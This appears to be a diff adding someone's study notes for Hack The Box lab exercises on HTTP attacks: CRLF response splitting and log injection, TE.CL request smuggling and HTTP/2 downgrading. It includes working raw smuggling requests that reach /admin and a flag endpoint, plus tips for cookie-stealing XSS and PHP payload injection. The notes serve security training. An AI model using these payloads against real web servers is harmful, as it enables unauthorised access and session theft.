@@ -1,0 +1,51 @@
+***CRLF Injection - HTTP Response Splitting***
+- When injecting the xss payload use a payload that makes a request to the other function in the webapp get logged and include the session cookie.
+
+
+***CRLF Injection - Log Injection***
+To reflect the results from the php code execution you must place the php payload in one of the other parameters(e.g name, email, phone) and then pass the same payload in the message paramter to cause the webapp to flag the request.
+
+
+***HTTP Request Smuggling/Desync Attacks - TE.CL***
+
+Make sure to specify the number of bytes in a chunk by using hexadecimal
+
+-----
+GET /404 HTTP/1.1
+Host: tecl.htb
+Content-Length: 4
+Transfer-Encoding: chunked
+
+27
+GET /admin HTTP/1.1
+Host: tecl.htb
+
+
+0
+-----
+
+- The number of bytes in the Chunk are 27 in hexadecimal and 39 in decimal.
+	- Make sure to include empty line after "Host: tecl.htb"(line 17)
+	- If you were to exclude the line and only count the characters the number of bytes would be 33. Don't forget to include the empty line in your calculations to get the correct number of bytes in the chunk. In this example that would be 39.
+
+
+
+***HTTP Request Smuggling/Desync Attacks - Exploitation Of Request Smuggling***
+- Tried using the %0d /r character to move cursor to the beginning of the line of the GET parameters:
+
+csrf=...&name=htb-stdnt&comment=test%0d
+
+***
+
+
+***HTTP/2 Downgrading - HTTP/2 Downgrading***
+
+- Make sure to append the Host: <Ip_address> after you append the dummy header.
+
+POST /index.php HTTP/2
+Host: <IP>
+Content-Length: 0
+
+Post /admin/index.php?reveal_flag=1 HTTP/2
+Dummy:
+Host: <IP>
